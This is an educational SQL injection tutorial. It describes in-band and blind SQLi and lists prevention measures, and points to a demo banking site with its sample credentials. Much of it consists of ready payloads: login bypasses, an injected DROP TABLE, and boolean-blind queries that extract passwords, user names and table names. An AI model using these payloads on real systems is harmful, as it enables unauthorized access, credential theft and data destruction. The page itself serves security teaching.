# SQL Injection

## What is SQL Injection?

**SQL injection \(SQLi\)** is an application security weakness that allows attackers to control an application’s database – letting them access or delete data, change an application’s data-driven behavior, and do other undesirable things – by tricking the application into sending unexpected SQL commands. SQL injections are among the most frequent threats to data security.

{% embed url="http://demo.testfire.net/" %}

username: jsmith

password: demo1234

* Say someone figures out a persons username. Someone can put a `'` after the username which is telling the system that we have ended the user input, then you can put a `SQL` comment character `--` \(dash dash\) after the `'` and what this does is comment out everything after this command sequence after the username, and something that is commonly after a username is a password check and by doing so bypasses the password allowing access to a users account. 

`jsmith'--` 

## 4 Most Common Types of SQL Injections

* **In-band SQL Injection \(SQLi\)**
  * **Error-based SQL Injection**:
    * Cause:
      * Relies on error messages thrown by the database server to obtain information about the structure of the database. 
  * **UNION-based SQL Injection**:
    * Cause:
      * Using UNION SQL operator to combine the results of two or more SELECT statements into a single result, which is then returned as part of the HTTP response.
* **Inferential SQL Injection \(Blind SQLi\)**
  * **Boolean-based SQL Injection**:
    * Cause: When an application is forced to return a different result depending on whether the query returns a TRUE or FALSE result. Based on the result, the content within the HTTP response will change, or remain the same.
  * **Time-based SQL Injection**:
    * Cause:
      * When sending an SQL query to the database, which forces the database to wait for a specified amount of time \(in seconds\) before responding. The time website takes to respond will indicate to the attacker whether the result of the query is TRUE or FALSE.

## Prevent or Mitigate SQL Injection Attacks



1. **Use parameterized queries:** \(think "variables"\) Parameterized queries force the developer to first define all the SQL code, and then pass in each parameter to the query later. This coding style allows the database to distinguish between code and data, regardless of what user input is supplied.
2. **Trust no-one:** Assume all user-submitted data is trying to attack you. Apply input validations such as `mysql_real_escape_string ()` to make sure that any malicious characters haven't passed to a SQL query through data. Than sanitize each data by filtering user data by context. For instance, email addresses must be filtered to enable only the characters allowed in email addresses or cell phone numbers must be filtered to allow for only the digits enabled in a phone number and so forth.
3. **Don't use dynamic SQL when it can be avoided:** Frequently, the data sanitization techniques could fail, so apply prepared statements, stored procedures or parameterized queries whenever you can. But, consider the fact that while stored procedures restrict some SQLi types, they slip to guard vs. many others, so don’t depend only on their use for your protection.
4. **Update and patch**: Vulnerabilities in databases and apps that fraudsters can take advantage of have commonly identified, so it's crucial to use patches and updates whenever possible.
5. **Firewall:** Consider a Web Application Firewall \(WAF\) – whether softer or appliance-based is an excellent solution to filter out malicious data. A firewall can be especially useful to serve some security protection versus a new vulnerability before a patch is available.
6. **Reduce your attack surface:** Get rid of any database functionality that you don't need to prevent a hacker taking advantage of it. 
7. **Apply sufficient privileges:** Avoid connecting your database through an account with admin-level privileges except you have some strong reason. Using a restricted account is a safer option, and can reduce an attacker malicious executes.
8. **Limited error message:** Assume that your application is not secure and act accordingly by encrypting or hashing passwords and other confidential data including connection strings so attackers can't figure out your database architecture through error messages, make sure that they only provide minimal info.
9. **Permanently maintain SQL statements from database-connected apps:** This will provide to detect fake SQL vulnerabilities and comments. Supervising tools that exploit computer learning or behavioral analyses can be beneficial.
10. **Don't forget the basics:** Change the passwords of application accounts into the database regularly. This is common sense, but in practice these passwords often stay unchanged for months or even years.
11. **Use better software:** Make coders responsible for checking the code and for fixing security flaws in custom applications before the software is delivered.

consider that we have a query, that is searching for the entered word in the database table:

_**select \* from notes nt where nt.subject = ‘search\_word‘;**_

Therefore instead of the search word, if we enter a SQL Injection query ‘ or 1=1;–, then the query will become always true.

_**select \* from notes nt where nt.subject = ‘ ‘ or 1=1;–**_

In this case, the parameter “subject“ is closed with the quote and then we have code or 1=1, which makes a query always true. With the sign “–“ we comment the rest of the query code, which will not be executed. It is one of the most popular and easiest ways to start controlling the query.

* ‘ or ‘abc‘=‘abc‘;–
* ‘ or ‘ ‘=‘ ‘;–

The most important part here is that after comma sign we can enter any malicious code, that we would like to be executed.

## **Login Page**

If the application has a login page, it is possible that the application uses a dynamic SQL such as the statement below. This statement is expected to return at least a single row with the user details from the Users table as the result set when there is a row with the username and password entered in the SQL statement.

`SELECT * FROM Users WHERE User_Name = ‘” & strUserName & “‘ AND Password = ‘” & strPassword & “’;”`

If the tester would enter John’; DROP table users\_details;’—as strUserName and anything as strPassword, the SQL statement would become like the one below.

`SELECT * FROM Users WHERE User_Name = ‘John’; DROP table users_details;’ –‘ AND Password = ‘Smith';`

**To gain access and find a user name.** Enter the string  as both user name and password in the frame on the right. This should get you logged in as a user \(jake happens to be the first user in the table\). This tells you that Jake is a user and it allows you to access his account - but it does not tell you his password.

**Find out if Jake's password includes the letter "w".** Enter `xxx` as user name and enter the following string as the password:

`' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%w%') AND ''='`

**Find out if Jake's password has "w" as the third letter.** Enter `xxx` as user name and enter the following string as the password: 

`' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '__w%') AND ''='`

## Force an Error

If you enter a string with a single quote in it such as `O'Brien` for either user name or password you will get a Software Error as the SQL is invalid and cannot be parsed.

### Force Entry

If you enter the string `' OR ''='` as both user name and password you can ensure that the WHERE clause always returns true. Without knowing any user names or passwords you can by-pass the log in screen. In this example you get the user name of the first person in the table.

The magic string works because it program evaluates:

```text
SELECT name from users WHERE name='name' AND password='password'
```

as the 'always true' string:

```text
SELECT name from users WHERE name='' OR ''='' AND password='' OR ''=''
```

## Find a password using SQL Injection

You can now get the system to answer questions about the password table. It will only ever answer yes \(and let you in\) or no \(by refusing entry\). Your questions must take the form of a valid SQL query. In each case use a `xx` for the user name and the text shown as password. You can ask questions such as:Does jake's password have a w in it?

`' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%w%') AND ''='`Does jake's password start with w?`' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE 'w%') AND ''='`Does jake's password have an w followed by d?`' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%w%d`%'\) AND ''='Is the fourth letter of jake's password w?`' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '___w%') AND ''='`

This works because the LIKE command uses % and \_ as wildcards. The % wildcard matches any string, the \_ wildcard matches a single character.

## Find a user names using SQL Injection Work space:

Are there more than 10 rows in the password table?`' OR (SELECT COUNT(*) FROM users)>10 AND ''='`

Is there a user with an r in his name?`' OR EXISTS(SELECT * FROM users WHERE name LIKE '%r%') AND ''='`

Is there a user \(other than jake\) with an a in his name?`' OR EXISTS(SELECT * FROM users WHERE name!='jake' AND name LIKE '%a%') AND ''='`

## Find Table Names using SQL Injection ``Work space:

You need to find out the name of the database that you are using. The function DATABASE\(\) will give you that value \(but you have to guess at it as before\). When you know the name of the database being used you can take guesses at the names of the tables. 

Does the current database contain the letter j?

`' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '%j%') AND ''='`

Is there a table called `one` in database test?

`' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='test' AND TABLE_NAME='one') AND ''='`

Is there more than one table in the database\(s\) containing a j?

`' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '%j%')>1 AND ''='`

## 

